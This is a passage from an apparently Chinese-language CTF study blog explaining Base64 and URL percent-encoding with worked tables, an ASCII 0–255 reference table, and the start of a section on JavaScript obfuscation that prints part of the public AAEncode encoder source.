1110</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>二进制位（6位）</td><td>01 0011</td><td>01 0110</td><td>00 0101</td><td>10 1110</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>十进制</td><td>19</td><td>22</td><td>5</td><td>46</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Base64编码</td><td><strong>T</strong></td><td><strong>W</strong></td><td><strong>F</strong></td><td><strong>u</strong></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table></div><p>M的Ascii码是77,前六位对应值为19，对应base64字符是T，如此类推。其它字符编码就可以自动转换得到！我们看看另外不是刚好是3个字节的情况！</p><div class="table-container"><table><thead><tr><th>文本（1 Byte）</th><th><strong>A</strong></th><th></th><th></th><th></th><th></th><th></th><th>B</th><th>C</th><th></th><th></th></tr></thead><tbody><tr><td>ASCII编码</td><td>65</td><td></td><td></td><td></td><td></td><td></td><td>66</td><td>67</td><td></td><td></td></tr><tr><td>二进制位（8位）</td><td>0100 0001</td><td></td><td></td><td></td><td></td><td></td><td>0100 0010</td><td>0100 0011</td><td></td><td></td></tr><tr><td>二进制位（6位）</td><td>01 0000</td><td>01 <strong>0000</strong></td><td></td><td></td><td></td><td></td><td>01 0000</td><td>10 0100</td><td>0011 <strong>00</strong></td><td></td></tr><tr><td>十进制</td><td>16</td><td>16</td><td></td><td></td><td></td><td></td><td>16</td><td>36</td><td>12</td><td></td></tr><tr><td>Base64编码</td><td><strong>Q</strong></td><td><strong>Q</strong></td><td><strong>=</strong></td><td><strong>=</strong></td><td></td><td></td><td><strong>Q</strong></td><td><strong>K</strong></td><td><strong>M</strong></td><td><strong>=</strong></td></tr></tbody></table></div><h3 id="8、URL编码"><a href="#8、URL编码" class="headerlink" title="8、URL编码"></a>8、URL编码</h3><h4 id="1）Url编码前置知识"><a href="#1）Url编码前置知识" class="headerlink" title="1）Url编码前置知识"></a>1）Url编码前置知识</h4><p><strong>Url编码的原则</strong>就是使用<strong>安全的字符</strong>（没有特殊用途或者特殊意义的可打印字符）去表示那些<strong>不安全的字符</strong>。</p><ul><li><p><strong>RFC3986文档</strong>规定，Url中只允许包含<strong>英文字母（a-z、A-Z）、数字（0-9）、-_.~4个特殊字符以及所有保留字符</strong>。</p><blockquote><p>RFC3986文档对Url的编解码问题做出了详细的建议，指出了哪些字符需要被编码才不会引起Url语义的转变，以及对为什么这些字符需要编码做出了相应的解释。</p></blockquote></li><li><p>保留字符：Url可以划分成若干个组件，协议、主机、路径等。有一些字符（<strong>:/?#[]@</strong>）是用作分隔不同组件的。RFC3986中指定了以下字符为保留字符：<strong>! * ‘ ( ) ; : @ &amp; = + $ , / ? # [ ]</strong></p><blockquote><p>例如:冒号用于分隔协议和主机，/用于分隔主机和路径，?用于分隔路径和查询参数，等等。</p><p>还有一些字符（!$&amp;’()*+,;=）用于在每个组件中起到分隔作用的，如=用于表示查询参数中的键值对，&amp;符号用于分隔查询多个键值对。当组件中的普通数据包含这些特殊字符时，需要对其进行编码。</p></blockquote></li><li><p>不安全字符：还有一些字符，当他们直接放在Url中的时候，可能会引起解析程序的歧义，这些字符被视为不安全字符。</p><ul><li>空格：Url在传输的过程，或者用户在排版的过程，或者文本处理程序在处理Url的过程，都有可能引入无关紧要的空格，或者将那些有意义的空格给去掉。</li><li>引号以及&lt;&gt;：引号和尖括号通常用于在普通文本中起到分隔Url的作用</li><li><h1 id="：通常用于表示书签或者锚点"><a href="#：通常用于表示书签或者锚点" class="headerlink" title="：通常用于表示书签或者锚点"></a>：通常用于表示书签或者锚点</h1></li><li>%：百分号本身用作对不安全字符进行编码时使用的特殊字符，因此本身需要编码</li><li>{}|\^[]`~：某一些网关或者传输代理会篡改这些字符</li></ul></li><li><p>需要注意的是，对于Url中的合法字符，编码和不编码是等价的，但是对于上面提到的这些字符，如果不经过编码，那么它们有可能会造成Url语义的不同。因此对于Url而言，只有普通<strong>英文字符和数字，特殊字符$-_.+!*’()还有保留字符</strong>，才能出现在未经编码的Url之中。其他字符均需要经过编码之后才能出现在Url中。</p></li><li>现在已经成为一种规范了，基本所有程序语言都有这种编码，如<strong>PHP有 urlencode、urldecode</strong>等。</li></ul><h4 id="2）如何进行编码"><a href="#2）如何进行编码" class="headerlink" title="2）如何进行编码"></a>2）如何进行编码</h4><ul><li><p>Url编码使用%（百分号）加十六进制。Url编码默认使用的字符集是ASCII。</p><blockquote><p>例如符号#在ASCII字符集中对应的字节为0x23，经过Url编码之后得到的是%23。</p></blockquote></li><li><p>对于非ASCII字符，需要使用ASCII字符集的超集进行编码得到相应的字节，然后对每个字节执行百分号编码。</p><blockquote><p>对于Unicode字符，RFC文档建议使用utf-8对其进行编码得到相应的字节，然后对每个字节执行百分号编码。</p><p>如”中文”使用UTF-8字符集得到的字节为0xE4 0xB8 0xAD 0xE6 0x96 0x87，经过Url编码之后到”%E4%B8%AD%E6%96%87”。</p></blockquote></li><li><p>如果某个字节对应着ASCII字符集中的某个非保留字符，则此字节无需使用百分号表示。</p><blockquote><p>例如”Url编码”，使用UTF-8编码得到的字节是0x55 0x72 0x6C 0xE7 0xBC 0x96 0xE7 0xA0 0x81，由于前三个字节对应着ASCII中的非保留字符”Url”，因此这三个字节可以用非保留字符”Url”表示。最终的Url编码可以简化成”Url%E7%BC%96%E7%A0%81” ，当然，如果你用”%55%72%6C%E7%BC%96%E7%A0%81”也是可以的。</p></blockquote></li></ul><h4 id="3）ASCII码对照表0-255："><a href="#3）ASCII码对照表0-255：" class="headerlink" title="3）ASCII码对照表0-255："></a>3）ASCII码对照表0-255：</h4><div class="table-container"><table><thead><tr><th><strong>十进制代码</strong></th><th><strong>十六进制代码</strong></th><th><strong>MCS 字符或缩写</strong></th><th><strong>DEC 多国字符名</strong></th></tr></thead><tbody><tr><td><strong>ASCII 控制字符 1</strong></td><td></td><td></td><td></td></tr><tr><td>0</td><td>0</td><td>NUL</td><td>空字符</td></tr><tr><td>1</td><td>1</td><td>SOH</td><td>标题起始 (Ctrl/A)</td></tr><tr><td>2</td><td>2</td><td>STX</td><td>文本起始 (Ctrl/B)</td></tr><tr><td>3</td><td>3</td><td>ETX</td><td>文本结束 (Ctrl/C)</td></tr><tr><td>4</td><td>4</td><td>EOT</td><td>传输结束 (Ctrl/D)</td></tr><tr><td>5</td><td>5</td><td>ENQ</td><td>询问 (Ctrl/E)</td></tr><tr><td>6</td><td>6</td><td>ACK</td><td>认可 (Ctrl/F)</td></tr><tr><td>7</td><td>7</td><td>BEL</td><td>铃 (Ctrl/G)</td></tr><tr><td>8</td><td>8</td><td>BS</td><td>退格 (Ctrl/H)</td></tr><tr><td>9</td><td>9</td><td>HT</td><td>水平制表栏 (Ctrl/I)</td></tr><tr><td>10</td><td>0A</td><td>LF</td><td>换行 (Ctrl/J)</td></tr><tr><td>11</td><td>0B</td><td>VT</td><td>垂直制表栏 (Ctrl/K)</td></tr><tr><td>12</td><td>0C</td><td>FF</td><td>换页 (Ctrl/L)</td></tr><tr><td>13</td><td>0D</td><td>CR</td><td>回车 (Ctrl/M)</td></tr><tr><td>14</td><td>0E</td><td>SO</td><td>移出 (Ctrl/N)</td></tr><tr><td>15</td><td>0F</td><td>SI</td><td>移入 (Ctrl/O)</td></tr><tr><td>16</td><td>10</td><td>DLE</td><td>数据链接丢失 (Ctrl/P)</td></tr><tr><td>17</td><td>11</td><td>DC1</td><td>设备控制 1 (Ctrl/Q)</td></tr><tr><td>18</td><td>12</td><td>DC2</td><td>设备控制 2 (Ctrl/R)</td></tr><tr><td>19</td><td>13</td><td>DC3</td><td>设备控制 3 (Ctrl/S)</td></tr><tr><td>20</td><td>14</td><td>DC4</td><td>设备控制 4 (Ctrl/T)</td></tr><tr><td>21</td><td>15</td><td>NAK</td><td>否定接受 (Ctrl/U)</td></tr><tr><td>22</td><td>16</td><td>SYN</td><td>同步闲置符 (Ctrl/V)</td></tr><tr><td>23</td><td>17</td><td>ETB</td><td>传输块结束 (Ctrl/W)</td></tr><tr><td>24</td><td>18</td><td>CAN</td><td>取消 (Ctrl/X)</td></tr><tr><td>25</td><td>19</td><td>EM</td><td>媒体结束 (Ctrl/Y)</td></tr><tr><td>26</td><td>1A</td><td>SUB</td><td>替换 (Ctrl/Z)</td></tr><tr><td>27</td><td>1B</td><td>ESC</td><td>换码符</td></tr><tr><td>28</td><td>1C</td><td>FS</td><td>文件分隔符</td></tr><tr><td>29</td><td>1D</td><td>GS</td><td>组分隔符</td></tr><tr><td>30</td><td>1E</td><td>RS</td><td>记录分隔符</td></tr><tr><td>31</td><td>1F</td><td>US</td><td>单位分隔符</td></tr><tr><td><strong>ASCII 特殊和数字字符</strong></td><td></td><td></td><td></td></tr><tr><td>32</td><td>20</td><td>SP</td><td>空格</td></tr><tr><td>33</td><td>21</td><td>!</td><td>感叹号</td></tr><tr><td>34</td><td>22</td><td>“</td><td>引号 (双引号)</td></tr><tr><td>35</td><td>23</td><td>#</td><td>数字符号</td></tr><tr><td>36</td><td>24</td><td>$</td><td>美元符</td></tr><tr><td>37</td><td>25</td><td>%</td><td>百分号</td></tr><tr><td>38</td><td>26</td><td>&amp;</td><td>和号</td></tr><tr><td>39</td><td>27</td><td>‘</td><td>省略号 (单引号)</td></tr><tr><td>40</td><td>28</td><td>(</td><td>左圆括号</td></tr><tr><td>41</td><td>29</td><td>)</td><td>右圆括号</td></tr><tr><td>42</td><td>2A</td><td>*</td><td>星号</td></tr><tr><td>43</td><td>2B</td><td>+</td><td>加号</td></tr><tr><td>44</td><td>2C</td><td>,</td><td>逗号</td></tr><tr><td>45</td><td>2D</td><td>—</td><td>连字号或减号</td></tr><tr><td>46</td><td>2E</td><td>.</td><td>句点或小数点</td></tr><tr><td>47</td><td>2F</td><td>/</td><td>斜杠</td></tr><tr><td>48</td><td>30</td><td>0</td><td>零</td></tr><tr><td>49</td><td>31</td><td>1</td><td>1</td></tr><tr><td>50</td><td>32</td><td>2</td><td>2</td></tr><tr><td>51</td><td>33</td><td>3</td><td>3</td></tr><tr><td>52</td><td>34</td><td>4</td><td>4</td></tr><tr><td>53</td><td>35</td><td>5</td><td>5</td></tr><tr><td>54</td><td>36</td><td>6</td><td>6</td></tr><tr><td>55</td><td>37</td><td>7</td><td>7</td></tr><tr><td>56</td><td>38</td><td>8</td><td>8</td></tr><tr><td>57</td><td>39</td><td>9</td><td>9</td></tr><tr><td>58</td><td>3A</td><td>:</td><td>冒号</td></tr><tr><td>59</td><td>3B</td><td>;</td><td>分号</td></tr><tr><td>60</td><td>3C</td><td>&lt;</td><td>小于</td></tr><tr><td>61</td><td>3D</td><td>=</td><td>等于</td></tr><tr><td>62</td><td>3E</td><td>&gt;</td><td>大于</td></tr><tr><td>63</td><td>3F</td><td>?</td><td>问号</td></tr><tr><td><strong>ASCII 字母字符</strong></td><td></td><td></td><td></td></tr><tr><td>64</td><td>40</td><td>@</td><td>商业 at 符号</td></tr><tr><td>65</td><td>41</td><td>A</td><td>大写字母 A</td></tr><tr><td>66</td><td>42</td><td>B</td><td>大写字母 B</td></tr><tr><td>67</td><td>43</td><td>C</td><td>大写字母 C</td></tr><tr><td>68</td><td>44</td><td>D</td><td>大写字母 D</td></tr><tr><td>69</td><td>45</td><td>E</td><td>大写字母 E</td></tr><tr><td>70</td><td>46</td><td>F</td><td>大写字母 F</td></tr><tr><td>71</td><td>47</td><td>G</td><td>大写字母 G</td></tr><tr><td>72</td><td>48</td><td>H</td><td>大写字母 H</td></tr><tr><td>73</td><td>49</td><td>I</td><td>大写字母 I</td></tr><tr><td>74</td><td>4A</td><td>J</td><td>大写字母 J</td></tr><tr><td>75</td><td>4B</td><td>K</td><td>大写字母 K</td></tr><tr><td>76</td><td>4C</td><td>L</td><td>大写字母 L</td></tr><tr><td>77</td><td>4D</td><td>M</td><td>大写字母 M</td></tr><tr><td>78</td><td>4E</td><td>N</td><td>大写字母 N</td></tr><tr><td>79</td><td>4F</td><td>O</td><td>大写字母 O</td></tr><tr><td>80</td><td>50</td><td>P</td><td>大写字母 P</td></tr><tr><td>81</td><td>51</td><td>Q</td><td>大写字母 Q</td></tr><tr><td>82</td><td>52</td><td>R</td><td>大写字母 R</td></tr><tr><td>83</td><td>53</td><td>S</td><td>大写字母 S</td></tr><tr><td>84</td><td>54</td><td>T</td><td>大写字母 T</td></tr><tr><td>85</td><td>55</td><td>U</td><td>大写字母 U</td></tr><tr><td>86</td><td>56</td><td>V</td><td>大写字母 V</td></tr><tr><td>87</td><td>57</td><td>W</td><td>大写字母 W</td></tr><tr><td>88</td><td>58</td><td>X</td><td>大写字母 X</td></tr><tr><td>89</td><td>59</td><td>Y</td><td>大写字母 Y</td></tr><tr><td>90</td><td>5A</td><td>Z</td><td>大写字母 Z</td></tr><tr><td>91</td><td>5B</td><td>[</td><td>左中括号</td></tr><tr><td>92</td><td>5C</td><td>\</td><td>反斜杠</td></tr><tr><td>93</td><td>5D</td><td>]</td><td>右中括号</td></tr><tr><td>94</td><td>5E</td><td>^</td><td>音调符号</td></tr><tr><td>95</td><td>5F</td><td>_</td><td>下划线</td></tr><tr><td>96</td><td>60</td><td>`</td><td>重音符</td></tr><tr><td>97</td><td>61</td><td>a</td><td>小写字母 a</td></tr><tr><td>98</td><td>62</td><td>b</td><td>小写字母 b</td></tr><tr><td>99</td><td>63</td><td>c</td><td>小写字母 c</td></tr><tr><td>100</td><td>64</td><td>d</td><td>小写字母 d</td></tr><tr><td>101</td><td>65</td><td>e</td><td>小写字母 e</td></tr><tr><td>102</td><td>66</td><td>f</td><td>小写字母 f</td></tr><tr><td>103</td><td>67</td><td>g</td><td>小写字母 g</td></tr><tr><td>104</td><td>68</td><td>h</td><td>小写字母 h</td></tr><tr><td>105</td><td>69</td><td>i</td><td>小写字母 i</td></tr><tr><td>106</td><td>6A</td><td>j</td><td>小写字母 j</td></tr><tr><td>107</td><td>6B</td><td>k</td><td>小写字母 k</td></tr><tr><td>108</td><td>6C</td><td>l</td><td>小写字母 l</td></tr><tr><td>109</td><td>6D</td><td>m</td><td>小写字母 m</td></tr><tr><td>110</td><td>6E</td><td>n</td><td>小写字母 n</td></tr><tr><td>111</td><td>6F</td><td>o</td><td>小写字母 o</td></tr><tr><td>112</td><td>70</td><td>p</td><td>小写字母 p</td></tr><tr><td>113</td><td>71</td><td>q</td><td>小写字母 q</td></tr><tr><td>114</td><td>72</td><td>r</td><td>小写字母 r</td></tr><tr><td>115</td><td>73</td><td>s</td><td>小写字母 s</td></tr><tr><td>116</td><td>74</td><td>t</td><td>小写字母 t</td></tr><tr><td>117</td><td>75</td><td>u</td><td>小写字母 u</td></tr><tr><td>118</td><td>76</td><td>v</td><td>小写字母 v</td></tr><tr><td>119</td><td>77</td><td>w</td><td>小写字母 w</td></tr><tr><td>120</td><td>78</td><td>x</td><td>小写字母 x</td></tr><tr><td>121</td><td>79</td><td>y</td><td>小写字母 y</td></tr><tr><td>122</td><td>7A</td><td>z</td><td>小写字母 z</td></tr><tr><td>123</td><td>7B</td><td>{</td><td>左大括号</td></tr><tr><td>124</td><td>7C</td><td>\</td><td></td><td>垂直线</td></tr><tr><td>125</td><td>7D</td><td>}</td><td>右大括号 (ALTMODE)</td></tr><tr><td>126</td><td>7E</td><td>~</td><td>代字号 (ALTMODE)</td></tr><tr><td>127</td><td>7F</td><td>DEL</td><td>擦掉 (DELETE)</td></tr><tr><td><strong>控制字符</strong></td><td></td><td></td><td></td></tr><tr><td>128</td><td>80</td><td></td><td>[保留]</td></tr><tr><td>129</td><td>81</td><td></td><td>[保留]</td></tr><tr><td>130</td><td>82</td><td></td><td>[保留]</td></tr><tr><td>131</td><td>83</td><td></td><td>[保留]</td></tr><tr><td>132</td><td>84</td><td>IND</td><td>索引</td></tr><tr><td>133</td><td>85</td><td>NEL</td><td>下一行</td></tr><tr><td>134</td><td>86</td><td>SSA</td><td>被选区域起始</td></tr><tr><td>135</td><td>87</td><td>ESA</td><td>被选区域结束</td></tr><tr><td>136</td><td>88</td><td>HTS</td><td>水平制表符集</td></tr><tr><td>137</td><td>89</td><td>HTJ</td><td>对齐的水平制表符集</td></tr><tr><td>138</td><td>8A</td><td>VTS</td><td>垂直制表符集</td></tr><tr><td>139</td><td>8B</td><td>PLD</td><td>部分行向下</td></tr><tr><td>140</td><td>8C</td><td>PLU</td><td>部分行向上</td></tr><tr><td>141</td><td>8D</td><td>RI</td><td>反向索引</td></tr><tr><td>142</td><td>8E</td><td>SS2</td><td>单移 2</td></tr><tr><td>143</td><td>8F</td><td>SS3</td><td>单移 3</td></tr><tr><td>144</td><td>90</td><td>DCS</td><td>设备控制字符串</td></tr><tr><td>145</td><td>91</td><td>PU1</td><td>专用 1</td></tr><tr><td>146</td><td>92</td><td>PU2</td><td>专用 2</td></tr><tr><td>147</td><td>93</td><td>STS</td><td>设置传输状态</td></tr><tr><td>148</td><td>94</td><td>CCH</td><td>取消字符</td></tr><tr><td>149</td><td>95</td><td>MW</td><td>消息等待</td></tr><tr><td>150</td><td>96</td><td>SPA</td><td>保护区起始</td></tr><tr><td>151</td><td>97</td><td>EPA</td><td>保护区结束</td></tr><tr><td>152</td><td>98</td><td></td><td>[保留]</td></tr><tr><td>153</td><td>99</td><td></td><td>[保留]</td></tr><tr><td>154</td><td>9A</td><td></td><td>[保留]</td></tr><tr><td>155</td><td>9B</td><td>CSI</td><td>控制序列引导符</td></tr><tr><td>156</td><td>9C</td><td>ST</td><td>字符串终止符</td></tr><tr><td>157</td><td>9D</td><td>OSC</td><td>操作系统命令</td></tr><tr><td>158</td><td>9E</td><td>PM</td><td>秘密消息</td></tr><tr><td>159</td><td>9F</td><td>APC</td><td>应用程序</td></tr><tr><td><strong>其他字符</strong></td><td></td><td></td><td></td></tr><tr><td>160</td><td>A0</td><td></td><td>[保留] 2</td></tr><tr><td>161</td><td>A1</td><td>¡</td><td>反向感叹号</td></tr><tr><td>162</td><td>A2</td><td>¢</td><td>分币符</td></tr><tr><td>163</td><td>A3</td><td>£</td><td>英磅符</td></tr><tr><td>164</td><td>A4</td><td></td><td>[保留] 2</td></tr><tr><td>165</td><td>A5</td><td>¥</td><td>人民币符</td></tr><tr><td>166</td><td>A6</td><td></td><td>[保留] 2</td></tr><tr><td>167</td><td>A7</td><td>§</td><td>章节符</td></tr><tr><td>168</td><td>A8</td><td>¤</td><td>通用货币符号 2</td></tr><tr><td>169</td><td>A9</td><td>©</td><td>版权符号</td></tr><tr><td>170</td><td>AA</td><td>ª</td><td>阴性顺序指示符</td></tr><tr><td>171</td><td>AB</td><td>«</td><td>左角引号</td></tr><tr><td>172</td><td>AC</td><td></td><td>[保留] 2</td></tr><tr><td>173</td><td>AD</td><td></td><td>[保留] 2</td></tr><tr><td>174</td><td>AE</td><td></td><td>[保留] 2</td></tr><tr><td>175</td><td>AF</td><td></td><td>[保留] 2</td></tr><tr><td>176</td><td>B0</td><td>°</td><td>温度符</td></tr><tr><td>177</td><td>B1</td><td>±</td><td>加/减号</td></tr><tr><td>178</td><td>B2</td><td>²</td><td>上标 2</td></tr><tr><td>179</td><td>B3</td><td>³</td><td>上标 3</td></tr><tr><td>180</td><td>B4</td><td></td><td>[保留] 2</td></tr><tr><td>181</td><td>B5</td><td>µ</td><td>微符</td></tr><tr><td>182</td><td>B6</td><td>¶</td><td>段落符，pilcrow</td></tr><tr><td>183</td><td>B7</td><td>·</td><td>中点</td></tr><tr><td>184</td><td>B8</td><td></td><td>[保留] 2</td></tr><tr><td>185</td><td>B9</td><td>¹</td><td>上标 1</td></tr><tr><td>186</td><td>BA</td><td>º</td><td>阳性顺序指示符</td></tr><tr><td>187</td><td>BB</td><td>»</td><td>右角引号</td></tr><tr><td>188</td><td>BC</td><td>¼</td><td>分数四分之一</td></tr><tr><td>189</td><td>BD</td><td>½</td><td>分数二分之一</td></tr><tr><td>190</td><td>BE</td><td></td><td>[保留] 2</td></tr><tr><td>191</td><td>BF</td><td>¿</td><td>反向问号</td></tr><tr><td>192</td><td>C0</td><td>À</td><td>带重音符的大写字母 A</td></tr><tr><td>193</td><td>C1</td><td>Á</td><td>带尖锐重音的大写字母 A</td></tr><tr><td>194</td><td>C2</td><td>Â</td><td>带音调符号的大写字母 A</td></tr><tr><td>195</td><td>C3</td><td>Ã</td><td>带代字号的大写字母 A</td></tr><tr><td>196</td><td>C4</td><td>Ä</td><td>带元音变音 (分音符号) 的大写字母 A</td></tr><tr><td>197</td><td>C5</td><td>Å</td><td>带铃声的大写字母 A</td></tr><tr><td>198</td><td>C6</td><td>Æ</td><td>大写字母 AE 双重元音</td></tr><tr><td>199</td><td>C7</td><td>Ç</td><td>带变音符号的大写字母 C</td></tr><tr><td>200</td><td>C8</td><td>È</td><td>带重音符的大写字母 E</td></tr><tr><td>201</td><td>C9</td><td>É</td><td>带尖锐重音的大写字母 E</td></tr><tr><td>202</td><td>CA</td><td>Ê</td><td>带音调符号的大写字母 E</td></tr><tr><td>203</td><td>CB</td><td>Ë</td><td>带元音变音 (分音符号) 的大写字母 E</td></tr><tr><td>204</td><td>CC</td><td>Ì</td><td>带重音符的大写字母 I</td></tr><tr><td>205</td><td>CD</td><td>Í</td><td>带尖锐重音的大写字母 I</td></tr><tr><td>206</td><td>CE</td><td>Î</td><td>带音调符号的大写字母 I</td></tr><tr><td>207</td><td>CF</td><td>Ï</td><td>带元音变音 (分音符号) 的大写字母 I</td></tr><tr><td>208</td><td>D0</td><td></td><td>[保留] 2</td></tr><tr><td>209</td><td>D1</td><td>Ñ</td><td>带代字号的大写字母 N</td></tr><tr><td>210</td><td>D2</td><td>Ò</td><td>带重音符的大写字母 O</td></tr><tr><td>211</td><td>D3</td><td>Ó</td><td>带尖锐重音的大写字母 O</td></tr><tr><td>212</td><td>D4</td><td>Ô</td><td>带音调符号的大写字母 O</td></tr><tr><td>213</td><td>D5</td><td>Õ</td><td>带代字号的大写字母 O</td></tr><tr><td>214</td><td>D6</td><td>Ö</td><td>带元音变音 (分音符号) 的大写字母 O</td></tr><tr><td>215</td><td>D7</td><td>OE</td><td>大写字母 OE 连字 2</td></tr><tr><td>216</td><td>D8</td><td>Ø</td><td>带斜杠的大写字母 O</td></tr><tr><td>217</td><td>D9</td><td>Ù</td><td>带重音符的大写字母 U</td></tr><tr><td>218</td><td>DA</td><td>Ú</td><td>带尖锐重音的大写字母 U</td></tr><tr><td>219</td><td>DB</td><td>Û</td><td>带音调符号的大写字母 U</td></tr><tr><td>220</td><td>DC</td><td>Ü</td><td>带元音变音 (分音符号) 的大写字母 U</td></tr><tr><td>221</td><td>DD</td><td>Y</td><td>带元音变音 (分音符号) 的大写字母 Y</td></tr><tr><td>222</td><td>DE</td><td></td><td>[保留] 2</td></tr><tr><td>223</td><td>DF</td><td>ß</td><td>德语高调小写字母 s</td></tr><tr><td>224</td><td>E0</td><td>à</td><td>带重音符的小写字母 a</td></tr><tr><td>225</td><td>E1</td><td>á</td><td>带尖锐重音的小写字母 a</td></tr><tr><td>226</td><td>E2</td><td>â</td><td>带音调符号的小写字母 a</td></tr><tr><td>227</td><td>E3</td><td>ã</td><td>带代字号的小写字母 a</td></tr><tr><td>228</td><td>E4</td><td>ä</td><td>带元音变音 (分音符号) 的小写字母 a</td></tr><tr><td>229</td><td>E5</td><td>å</td><td>带铃声的小写字母 a</td></tr><tr><td>230</td><td>E6</td><td>æ</td><td>小写字母 ae 双重元音</td></tr><tr><td>231</td><td>E7</td><td>ç</td><td>带变音符号的小写字母 c</td></tr><tr><td>232</td><td>E8</td><td>è</td><td>带重音符的小写字母 e</td></tr><tr><td>233</td><td>E9</td><td>é</td><td>带尖锐重音的小写字母 e</td></tr><tr><td>234</td><td>EA</td><td>ê</td><td>带音调符号的小写字母 e</td></tr><tr><td>235</td><td>EB</td><td>ë</td><td>带元音变音 (分音符号) 的小写字母 e</td></tr><tr><td>236</td><td>EC</td><td>ì</td><td>带重音符的小写字母 i</td></tr><tr><td>237</td><td>ED</td><td>í</td><td>带尖锐重音的小写字母 i</td></tr><tr><td>238</td><td>EE</td><td>î</td><td>带音调符号的小写字母 i</td></tr><tr><td>239</td><td>EF</td><td>ï</td><td>带元音变音 (分音符号) 的小写字母 i</td></tr><tr><td>240</td><td>F0</td><td></td><td>[保留] 2</td></tr><tr><td>241</td><td>F1</td><td>ñ</td><td>带代字号的小写字母 n</td></tr><tr><td>242</td><td>F2</td><td>ò</td><td>带重音符的小写字母 o</td></tr><tr><td>243</td><td>F3</td><td>ó</td><td>带尖锐重音的小写字母 o</td></tr><tr><td>244</td><td>F4</td><td>ô</td><td>带音调符号的小写字母 o</td></tr><tr><td>245</td><td>F5</td><td>õ</td><td>带代字号的小写字母 o</td></tr><tr><td>246</td><td>F6</td><td>ö</td><td>带元音变音 (分音符号) 的小写字母 o</td></tr><tr><td>247</td><td>F7</td><td>oe</td><td>小写字母 oe 连字 2</td></tr><tr><td>248</td><td>F8</td><td>ø</td><td>带斜杠的小写字母 o</td></tr><tr><td>249</td><td>F9</td><td>ù</td><td>带重音符的小写字母 u</td></tr><tr><td>250</td><td>FA</td><td>ú</td><td>带尖锐重音的小写字母 u</td></tr><tr><td>251</td><td>FB</td><td>û</td><td>带音调符号的小写字母 u</td></tr><tr><td>252</td><td>FC</td><td>ü</td><td>带元音变音 (分音符号) 的小写字母 u</td></tr><tr><td>253</td><td>FD</td><td>ÿ</td><td>带元音变音 (分音符号) 的小写字母 y 2</td></tr><tr><td>254</td><td>FE</td><td></td><td>[保留] 2</td></tr><tr><td>255</td><td>FF</td><td></td><td>[保留] 2</td></tr></tbody></table></div><h3 id="9、JS代码混淆"><a href="#9、JS代码混淆" class="headerlink" title="9、JS代码混淆"></a>9、JS代码混淆</h3><p><a href="https://examine2.top/2020/02/12/JS代码混淆/">JS代码混淆 | examine2’s Blog</a></p><h4 id="1）AAEncode"><a href="#1）AAEncode" class="headerlink" title="1）AAEncode"></a>1）AAEncode</h4><p>什么是AAEncode？ 就是将JavaScript代码转换成颜文字网络表情的编码。</p><p>经过aaencode混淆的JS代码十分显眼，通篇代码呈现 <code>(ﾟДﾟ)(ﾟoﾟ)(ﾟΘﾟ)</code> 之类的颜文字，相当可爱。</p><p><strong>在线解密：</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/109a4bf02dd139a0432ac65efb29fc71.png" alt="1"></p><p><strong>直接运行：</strong></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/01da495f776f5048b76eee04c6f1fab5.png" alt="3"></p><p><img src="/2021/11/20/CTF/Crypto/Crypto/08b33b7b0ab51060b426577f38e9a6fb.png" alt="2"></p><p><strong>源码：</strong></p><pre><code>function aaencode( text )&#123;    var t;    var b = [        &quot;(c^_^o)&quot;,        &quot;(ﾟΘﾟ)&quot;,        &quot;((o^_^o) - (ﾟΘﾟ))&quot;,        &quot;(o^_^o)&quot;,        &quot;(ﾟｰﾟ)&quot;,        &quot;((ﾟｰﾟ) + (ﾟΘﾟ))&quot;,        &quot;((o^_^o) +(o^_^o))&quot;,        &quot;((ﾟｰﾟ) + (o^_^o))&quot;,        &quot;((ﾟｰﾟ) + (ﾟｰﾟ))&quot;,        &quot;((ﾟｰﾟ) + (ﾟｰﾟ) + (ﾟΘﾟ))&quot;,        &quot;(ﾟДﾟ) .ﾟωﾟﾉ&quot;,        &quot;(ﾟДﾟ) .ﾟΘﾟﾉ&quot;,        &quot;(ﾟДﾟ) [&#39;c&#39;]&quot;,        &quot;(ﾟДﾟ) .ﾟｰﾟﾉ&quot;,        &quot;(ﾟДﾟ) .ﾟДﾟﾉ&quot;,        &quot;(ﾟДﾟ) [ﾟΘﾟ]&quot;        ];    var r = &quot;ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#39;_&#39;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); &quot;;     if( /ひだまりスケッチ×(365|３５６)\s*来週も見てくださいね[!！]/.test( text ) )&#123;        r += &quot;X=_=3; &quot;;        r += &quot;\r\n\r\n    X / _ / X &lt; \&quot;来週も見てくださいね!\&quot;;\r\n\r\n&quot;;    &#125;    r += &quot;(ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);&quot;+        &quot;(ﾟДﾟ)=&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟΘﾟ] &quot;+        &quot;,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] &quot;+        &quot;,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#39;_&#39;) [c^_^o];&quot;+        &quot;(ﾟДﾟ) [&#39;c&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];&quot;+        &quot;(ﾟДﾟ) [&#39;o&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];&quot;+        &quot;(ﾟoﾟ)=(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟｰﾟ] + &quot;+        &quot;((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+&quot;+        &quot;((ﾟｰﾟ==3) 